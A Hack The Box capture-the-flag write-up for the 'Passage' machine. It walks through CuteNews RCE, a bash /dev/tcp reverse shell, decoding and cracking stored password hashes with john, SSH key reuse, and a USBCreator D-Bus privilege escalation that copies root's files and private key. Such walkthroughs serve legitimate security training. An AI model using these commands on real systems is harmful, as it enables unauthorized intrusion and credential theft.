# Introduction

[![Passage](https://www.hackthebox.eu/storage/avatars/ec88bbe570fd512ab370208e5139bb41.png)](https://www.hackthebox.eu/home/machines/profile/275)

| Point | Description |
| :------:| :------: |
| Name | Passage  |
| OS   | Linux  |
| Difficulty Rating| Medium   |
| Release | 05 Sep 2020   |
| IP | 10.10.10.206   |
| Owned | 26 Feb 2021 |

# Short retelling

* Detect version of CMS
* Exploit vulnerability of it
* Find hash of password in logs
* Get User.txt
* Get another user's privileges
* Exploite the vulnerability in USBCreator D-Bus
* Get Root.txt

# Enumeration

## Nmap

Let's start reconing machine "Passage" 10.10.10.206 with Nmap

```
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# nmap -sV -p- -sC 10.10.10.206                                                                                                                                    130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 05:40 EST
Nmap scan report for passage.htb (10.10.10.206)
Host is up (0.16s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2075.34 seconds

```
We find 80/tcp and 22/tcp ports, so lets add *passage.htb* to /etc/hosts  

In web-site http://passage.htb we see *Passage News* and info about *fail2ban*.

![Passage](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-27_174350.png)

So we can't use any tools of bruteforce or enumeration.

![Passage](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-27_174654.png)

At the end of the sebsite we see info about CMS - *CuteNews*

![Passage](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-27_175227.png)

If we wiil google info about *CuteNews*, we find out about a special directory of it.

![Passage](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-27_175511.png)

Ok, we have register form and know about version of *CMS CuteNews*

# Explotation

Trying to register and we get success

![Passage](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-27_175910.png)

Also we find some exploits for *CuteNews 2.1.2*

* https://www.exploit-db.com/exploits/48800
* https://www.exploit-db.com/exploits/46698

I decide to download the fisrt python script and run it.

```
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# python3 cutemews.py        



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

Enter the URL> http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: QA1E3ethbH and password: QA1E3ethbH

=======================================================
Sending Payload
=======================================================
signature_key: 33a00534b3b13998f2e321d108cbcb24-QA1E3ethbH
signature_dsi: 2e1691e9dd32096f2f6d4d53119be6ac
logged in user: QA1E3ethbH
============================
Dropping to a SHELL
============================

command > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

command > hostname
passage

command > ls
avatar_QA1E3ethbH_QA1E3ethbH.php
avatar_egre55_ykxnacpt.php
avatar_hacker_jpyoyskt.php

command > 
```

And we get the opportunity to RCE on the server.

Now we need get a reverse shell.

```
command > /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.147/5555 0>&1'
```

```
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# ip a | grep tun
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    inet 10.10.14.147/23 scope global tun0
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# nc -lvp 5555                
listening on [any] 5555 ...
connect to [10.10.14.147] from passage.htb [10.10.10.206] 47256
bash: cannot set terminal process group (1626): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@passage:/var/www/html/CuteNews/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<tml/CuteNews/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'       
www-data@passage:/var/www/html/CuteNews/uploads$ 
```

# Privilege Escalation#1

Checking home direcory and we find out about two users *Paul* and *Nadav*

```
www-data@passage:/var/www/html/CuteNews/uploads$ ls /home
ls /home
nadav  paul
www-data@passage:/var/www/html/CuteNews/uploads$ ls /home/nadav
ls /home/nadav
ls: cannot open directory '/home/nadav': Permission denied
www-data@passage:/var/www/html/CuteNews/uploads$ ls /home/paul
ls /home/paul
ls: cannot open directory '/home/paul': Permission denied
www-data@passage:/var/www/html/CuteNews/uploads$ 
```

When we run LinPeas script we noticed a interesting directory `/var/www/html/CuteNews/`

We find sime sensitive files in the direcory `/var/www/html/CuteNews/cdata/users/`

```
www-data@passage:/var/www/html/CuteNews/cdata/users$ ls -lvpa
ls -lvpa
total 124
drwxrwxrwx  2 www-data www-data 4096 Feb 27 03:12 ./
drwxrwxrwx 11 www-data www-data 4096 Feb 27 03:12 ../
-rw-r--r--  1 www-data www-data  109 Aug 30 16:23 0a.php
-rw-r--r--  1 www-data www-data  121 Feb 27 02:30 5b.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 5d.php
-rw-r--r--  1 www-data www-data  109 Feb 27 03:07 6b.php
-rw-r--r--  1 www-data www-data  133 Aug 31 14:54 6e.php
-rw-r--r--  1 www-data www-data  105 Feb 27 02:30 6f.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18  2020 7a.php
-rwxr-xr-x  1 www-data www-data  109 Jun 18  2020 8f.php
-rwxr-xr-x  1 www-data www-data  133 Jun 18  2020 09.php
-rw-r--r--  1 www-data www-data  129 Feb 27 03:07 9f.php
-rw-r--r--  1 www-data www-data  125 Aug 30 16:23 16.php
-rwxr-xr-x  1 www-data www-data  437 Jun 18  2020 21.php
-rw-r--r--  1 www-data www-data  109 Aug 31 14:54 32.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18  2020 52.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 66.php
-rw-r--r--  1 www-data www-data  117 Feb 27 03:12 76.php
-rwxr-xr-x  1 www-data www-data  117 Jun 18  2020 77.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 97.php
-rwxr-xr-x  1 www-data www-data  489 Jun 18  2020 b0.php
-rw-r--r--  1 www-data www-data  409 Feb 27 02:30 bb.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18  2020 c8.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18  2020 d4.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18  2020 d5.php
-rw-r--r--  1 www-data www-data 1213 Aug 31 14:55 d6.php
-rw-r--r--  1 www-data www-data  609 Feb 27 03:12 e1.php
-rw-r--r--  1 www-data www-data  389 Feb 27 03:07 ec.php
-rw-r--r--  1 www-data www-data  137 Feb 27 03:12 ef.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18  2020 fc.php
-rw-r--r--  1 www-data www-data 3840 Aug 30 17:54 lines
-rw-r--r--  1 www-data www-data    0 Jun 18  2020 users.txt
```

File *lines* is the biggest of them, so let's open it

```
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat lines
cat lines
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=
<?php die('Direct call - access denied'); ?>
<?php die('Direct call - access denied'); ?>
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=
www-data@passage:/var/www/html/CuteNews/cdata/users$ 
```

And we see many base64 strings. Enumerate these strings and find *credentials* for user Paul

```
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# echo 'YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=' | base64 -d
a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# echo '' | base64 -d 
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# echo 'YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=' | base64 -d
a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# echo 'YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19' | base64 -d 
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}} 
```

Name: paul-coles
Email: paul@passage.htb
Pass: e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd

The password looks like hash. We need to know what is cash and after bruteforce it.

Using hash analyzer in the [website](https://www.tunnelsup.com/hash-analyzer/), we understand that is SHA-256

![Passage](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-27_183351.png)

Use [john](https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/) for crack it.

```
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# cat pass.txt  
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 pass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
atlanta1         (?)
1g 0:00:00:00 DONE (2021-02-27 06:38) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..eatme1
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

We cracked password **atlanta1**

After we obtained paul password, we can try to switch user to paul

```
www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
su paul
Password: atlanta1

paul@passage:/var/www/html/CuteNews/cdata/users$ id
id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
```

Get **user.txt**

```
paul@passage:/var/www/html/CuteNews/cdata/users$ cd ~
cd ~
paul@passage:~$ ls
ls
Desktop    Downloads         Music     Public     user.txt
Documents  examples.desktop  Pictures  Templates  Videos
paul@passage:~$ cat user.txt
cat user.txt
ca2fca518c438fb7164e7985bb50a009
```

Enumerate home direcory and find id_rsa of paul

```
paul@passage:~$ ls -lvpa
ls -lvpa
total 112
drwxr-x--- 16 paul paul 4096 Feb  5 06:30 ./
drwxr-xr-x  4 root root 4096 Jul 21  2020 ../
-rw-------  1 paul paul 1936 Feb  5 06:30 .ICEauthority
-rw-------  1 paul paul   52 Feb  5 06:30 .Xauthority
-rw-r--r--  1 paul paul 3770 Jul 21  2020 .bashrc
----------  1 paul paul    0 Jul 21  2020 .bash_history
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
drwx------ 10 paul paul 4096 Sep  1 02:10 .cache/
drwx------ 14 paul paul 4096 Aug 24  2020 .config/
-rw-r--r--  1 paul paul   25 Aug 24  2020 .dmrc
drwx------  2 paul paul 4096 Aug 24  2020 .gconf/
drwx------  3 paul paul 4096 Feb  5 06:58 .gnupg/
drwx------  3 paul paul 4096 Aug 24  2020 .local/
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .ssh/
-rw-------  1 paul paul 1304 Feb  5 06:58 .xsession-errors
-rw-------  1 paul paul 1180 Feb  5 04:42 .xsession-errors.old
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Desktop/
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Documents/
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Downloads/
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Music/
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Pictures/
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Public/
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Templates/
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Videos/
-rw-r--r--  1 paul paul 8980 Apr 20  2016 examples.desktop
-r--------  1 paul paul   33 Feb 27 02:29 user.txt
paul@passage:~$ cd .ssh
cd .ssh
paul@passage:~/.ssh$ ls
ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
```

Lsi we find out, that paul has id_rsa.pub of nadav

```
paul@passage:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
paul@passage:~/.ssh$ cat id_rsa.pub
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```

Nadav is the interesting user< he hasmay privileges and we still don't have access to his home directory

```
[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                     
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
uid=1001(paul) gid=1001(paul) groups=1001(paul)
```

Hmm, let's try use ssh connect with *Nadav*.

```
┌──(root💀kali)-[/home/kali/HTB/Passage]
└─# ssh -i id_rsa_paul nadav@passage.htb
load pubkey "id_rsa_paul": invalid format
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

And we get success.

# Privilege Escalation#2

In the report of LinPEAS script we find that USBCreator is vulnerable

```
[+] USBCreator                                                                                                                                                             
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
Vulnerable!!                                                                                                                                                               
```

I find a [article](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) about  it.

By following what is written in this article, we can access root

```
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /root.txt true()
nadav@passage:~$ ls /
bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  root.txt  run  sbin  srv  sys  tmp  usr  var  vmlinuz
nadav@passage:~$ cat /root.txt 
25883ae3a123b8fda7e288859098ea6b
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /id_rsa_root true
()
nadav@passage:~$ ls /
bin   cdrom  etc   id_rsa_root  initrd.img.old  lib64       media  opt   root      run   srv  tmp  var
boot  dev    home  initrd.img   lib             lost+found  mnt    proc  root.txt  sbin  sys  usr  vmlinuz
```

# Result and Resources

1. https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
2. https://www.exploit-db.com/exploits/48800
3. https://www.exploit-db.com/exploits/46698
4. https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/

